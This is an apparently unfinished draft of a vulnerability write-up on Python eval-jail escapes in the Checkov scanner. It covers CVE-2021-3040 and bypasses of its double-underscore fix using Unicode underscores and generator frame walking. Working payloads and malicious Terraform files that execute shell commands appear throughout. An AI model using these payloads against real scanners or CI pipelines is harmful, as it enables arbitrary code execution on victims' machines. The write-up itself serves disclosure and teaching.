---
title: "CVE-2025-2180 - Breaking out of a Python Jail in a Popular IaC Scanning Tool"
date: "2025-10-16"
summary: " "
description: ""
toc: false
readTime: true
autonumber: false
math: false
tags: ["python", "Bug Bounty"]
showTags: false
hideBg: true
draft: true
---
## Background - An Earlier CVE in Checkov
Back in 2021, I was browsing through the source code of the infrastructure-as-code scanning tool [Checkov](https://github.com/bridgecrewio/checkov), when I stumbled across a few very interesting [lines of code](https://github.com/bridgecrewio/checkov/blob/65b28a4810e2ce668a063ea0077cab349852cba6/checkov/terraform/variable_rendering/evaluate_terraform.py#L46).

```
def _try_evaluate(input_str):
    try:
        return eval(input_str, {"__builtins__": None}, SAFE_EVAL_DICT) # nosec
    except Exception:
        try:
            return eval(f'"{input_str}"', {"__builtins__": None}, SAFE_EVAL_DICT) # nosec
        except Exception:
            return input_str
# (input str is user-supplied input)
```

Show this to any security nerd who is familiar with python, and theyâ€™ll immediately recognize it - this is a classic example of an unsafe python jail. Iâ€™m not entirely sure where the idea originated, but this specific invocation of eval is often considered to be a â€œsafe evalâ€ function. The thinking is that if you remove builtins from the globals (second argument to eval), and replace the locals (third argument), the code that is passed into `eval` wonâ€™t have access to anything interesting, and thus canâ€™t do anything dangerous.

This is, of course, not the case. Python is a very dynamic language and itâ€™s possible to recover the builtins by walking up the class hierarchy. You start with `{}.__class__.__subclassess` (subclasses, of the `dict` class), and keep poking around until you find a module that gives you access to the builtins, grab  `__import__` and use it to import `os.system`, and execute shell commands. A full python jail escape looks something like this:

```
[x for x in {}.__class__.__bases__[0].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['_'+'_import_'+'_']('os').system(â€˜whoamiâ€™)
```

This in the case of Checkov, this code was being used to evalute HCL within Terraform arguments. The vulnerability could be exploited by running `checkov -f evil.tf` on a Terraform file containing the jail escape, such as the one below:
```
resource "random_pet" "server" {
  keepers = {
    ami_id = "[x for x in {}.__class__.__bases__[0].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('date >> /tmp/pwned_from_checkov')"
  }
}
```

A sent this POC to the Checkov maintainers through their responsible disclosure program.

## An Incomplete Fix
After assigning [CVE-2021-3040](https://nvd.nist.gov/vuln/detail/CVE-2021-3040) to this issue, the Checkov maintainers decided to fix this vulnerability by blocking any input string that contained a double underscore, theoretically blocking the ability to access the attributes neccesary for the exploit.
```
def evaluate(input_str):
    if "__" in input_str:
        logging.warning(f"got a substring with double underscore, which is not allowed. origin string: {input_str}")
        return input_str
    return eval(input_str, {"__builtins__": None}, SAFE_EVAL_DICT)  # nosec
```

This fix didnâ€™t sit well with me - it seemed plausible that there was a way to execute arbitrary code without using a double underscore. I didnâ€™t have POC, nor the time to research the problem further, so I decided to move on. Years later, this project caught my attention again and I decided to give it another go. I was much more successful this time aroundâ€¦

## Bypass One: Unicode Underscores
This first one is a neat party trick. It turns out there are a handful of characters that the python interpreter considers to be functionally equivalent to an underscore. If you want to get into the nitty-gritty details you can read about [NFKC Normalization](https://peps.python.org/pep-3131/), but the short story is these unicode characters are normalized into an ASCII underscore, and can be used as a drop-in replacement for an underscore in most places in your python code. One example of such a character is the [fullwidth low line](https://www.compart.com/en/unicode/U+FF3F). Crucially, these characters are only treated as replacements by the python interpreter, but are distinct if they appear in strings. For example:

```
Python 3.13.1 (main, Dec  3 2024, 17:59:52) [Clang 16.0.0 (clang-1600.0.26.4)] on darwin

>> # Example character that will normalize to an underscore
>>> chr(0xFE4D)
'ï¹'
>>> underscore_example_variable = 123
>>> underscoreï¹exampleï¹variable
123
>>> '_' in 'noï¹underscoresï¹here'
False
```

With this knowledge, it was easy to modify my previous exploit so that it would pass the `__ in input_str` check:
```
# Any of these unicode characters are equivalent to an underscore
UNDERSCORE_REPLACEMENTS = [
   chr(0xFF3F),    # Fullwidth Low Line
   chr(0xFE4F),    # Wavy low line, very fun
   chr(0xFE4D),    # Dashed low line
   chr(0xFE4E),    # Centreline low line
]

original_exploit = "[x for x in {}.__class__.__bases__[0].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['_'+'_import_'+'_']('os').system('date >> /tmp/pwned_from_checkov')"
original_exploit = x.replace("__", "_" + UNDERSCORE_REPLACEMENTS[3])
```
The exploit Terraform file:
```
resource "random_pet" "server" {
  keepers = {
    ami_id = "[x for x in {}._ï¹Žclass_ï¹Ž._ï¹Žbases_ï¹Ž[0]._ï¹Žsubclasses_ï¹Ž() if x._ï¹Žname_ï¹Ž == 'catch_warnings'][0]()._module._ï¹Žbuiltins_ï¹Ž['_'+'_import_'+'_']('os').system('date >> /tmp/unicode-example')"
  }
}
```

Running Checkov against this file again, gives us arbitrary code execution! Wow, that was quite easyðŸŽ‰

## Bypass Two: Walking Up the Stack via Python Frames
The unicode bypass felt a bit unsatisfying. I anticipated that the maintainers might fix this issue by simply normalizing unicode characters, so I decided to see if I could come up with a better exploit. Is there a clever way to sneak around the dunder check assuming no special unicode characters are allowed? 

As it turns out, yes! Hereâ€™s a sneak peak of the full exploit, then letâ€™s talk about how it works:

`((gen:=(gen_list[0].gi_frame.f_back.f_back.f_globals for _ in [1,]),v:=gen_list.append(gen), gen_list[0])[2] for gen_list in [[]]).send(None).send(None).get('_'+'_builtins_'+'_')['_'+'_import_'+'_']('os').system('date >> /tmp/gen-example')`
```python {class="wrap" id="my-codeblock"}
((gen:=(gen_list[0].gi_frame.f_back.f_back.f_globals for _ in [1,]),v:=gen_list.append(gen), gen_list[0])[2] for gen_list in [[]]).send(None).send(None).get('_'+'_builtins_'+'_')['_'+'_import_'+'_']('os').system('date >> /tmp/gen-example')
```

#### Generators
The execution environment in the `eval` is very limited: no builtins, no imports, no `getattr`, only a handful of functions available to be called . I spent a while exploring potential exploits involving f-strings before deciding a new path: generators. Generators are a way of returning a sequence of items - if you've ever used the `yield` keyword, you are familiar. A slightly more obscure feature of Python is generator functions, they look similar to list comprehensions but don't involve a list, i.e: `(x for x in [1,2,3])`. This shorthand returns a `generator` object, and is allowed within our jail.

```
eval('(x for x in (1,2,3))', {'__builtins__': None}, {})
<generator object <genexpr> at 0x104f007c0>
```

Whats so interesting about a generator? What we're really after is the generator's `gi_frame` attribute, but this will take a bit of explaining...

### Stack Frames
_Should I combine with the previous section_
Every function call in python causes a new [Frame object](https://docs.python.org/3/reference/datamodel.html#frame-objects) to be pushed on the execution stack, with ecapsulates the function (`frame.f_code`), global and local variables (`f_globals`,`f_locals`), and a number of other things. Frames on the execution stack are also part of a linked list, where each points to the previous frame (its caller).
